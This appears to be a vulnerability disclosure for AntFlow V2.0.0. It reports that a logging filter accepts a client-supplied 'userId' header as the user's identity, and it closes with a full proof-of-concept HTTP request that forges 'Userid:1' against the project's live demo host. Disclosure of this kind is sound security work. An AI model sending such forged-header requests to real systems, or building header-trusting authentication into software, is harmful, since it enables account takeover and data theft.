# Identity verification mechanism
##### Vulnerability Location: JiMuMDCCommonsRequestLoggingFilter.java
##### Affected Range: AntFlow V2.0.0
##### Vulnerability Cause: JiMuMDCCommonsRequestLoggingFilter.java retrieves the userid from the request header as the core of the identity verification mechanism, allowing attackers to forge any user identity credential information, thereby causing sensitive information leakage.
##### Vulnerability Impact: Any user takeover
##### Link: https://gitee.com/tylerzhou/Antflow/
# Vulnerability recurrence

The following test has been verified by the official testing station: https://antflow.top/admin/#/login? redirect=/index

<img width="920" height="478" alt="image" src="https://github.com/user-attachments/assets/b4c9b35d-fce0-4ab4-a412-393580760687" />

After a normal login, you can view the process monitoring information. When there is no authentication, the request and response are as follows:

<img width="920" height="446" alt="image" src="https://github.com/user-attachments/assets/c86c4acd-7782-4423-add3-0477b18cd40b" />

By using the request header "userId" for forgery, one can directly obtain the corresponding sensitive information:

<img width="920" height="464" alt="image" src="https://github.com/user-attachments/assets/fe0a3728-e80c-4517-90a5-b4c2c18171a0" />

# Code Analysis

As can be seen from JiMuMDCCommonsRequestLoggingFilter.java:

a. No real authentication: The system directly reads the userId/Userid, userName, tenantId, and tenantUser from the request header.
b. Complete trust for the client: Any string will be accepted and set as the current user.
c. User name controllable: It is directly used after URLDecoder decoding.
d. No session verification: There is no Session, JWT verification, or any authentication framework.

<img width="920" height="620" alt="image" src="https://github.com/user-attachments/assets/2b88dcce-f294-4650-b1da-1e1a560828ef" />

In the code, the userId and userName in the request header were directly obtained. Then, if the userid is not empty, it would be registered as the current user.

<img width="920" height="574" alt="image" src="https://github.com/user-attachments/assets/31c32deb-f2b0-4f1c-94d8-666ab22f73bd" />

Therefore, we can attempt to directly add the "userId" to the request header in order to bypass the authentication and authorization mechanism.

# POC
```
POST /admin-api/bpmnConf/process/listPage/6 HTTP/1.1
Host: antflow.top
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="146", "Not=A?Brand";v="8", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Userid:1
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: application/json
Content-Length: 70

{"pageDto":{"page":1,"pageSize":10},"taskMgmtVO":{"includeAllFlag":0}}
```
